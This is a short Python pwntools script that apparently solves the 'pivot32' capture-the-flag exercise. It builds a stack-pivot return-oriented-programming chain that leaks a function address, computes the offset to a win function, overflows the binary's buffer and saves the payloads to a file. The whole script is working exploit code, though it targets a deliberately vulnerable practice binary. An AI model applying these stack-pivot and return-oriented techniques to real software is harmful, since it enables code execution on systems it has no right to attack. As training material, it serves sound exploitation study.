from pwn import *
import gadgets

binary = './pivot32'
padding = 44


def hex2int(s):
    return int(s[2:], 16)

func_diff = 0x967 - 0x770


# end of content
p = process(binary)
r = p.recvuntil('> ')
print(r.decode())
base_addr = hex2int(r.decode().strip().splitlines()[-3].split(': ')[1])
log.info('base: ' + hex(base_addr))

payload_smash = b''
payload_smash += gadgets.pop_eax(base_addr)
payload_smash += p32(0x080488c2) # xchg eax, esp; ret;

payload = p32(0x080485f0) # call foothold

# get real address of foothold, store in rax
payload += gadgets.pop_eax(0x804a024)
payload += p32(0x080488c4) # mov eax, dword ptr [eax]; ret;

# add offset to rax, stored ret2win func addr
payload += gadgets.pop_ebx(func_diff)
payload += p32(0x080488c7) # add eax, ebx; ret;

# just call
payload += p32(0x080486a3) # call eax


p.sendline(payload)
p.recvuntil('> ')
p.sendline(padding * b'a' + payload_smash)
#  p.interactive()
p.wait()
print(p.recvall().decode())

with open('payload.bin', 'wb') as f:
    f.write(payload + b'\n')
    f.write(b'a' * padding + payload_smash + b'\n')
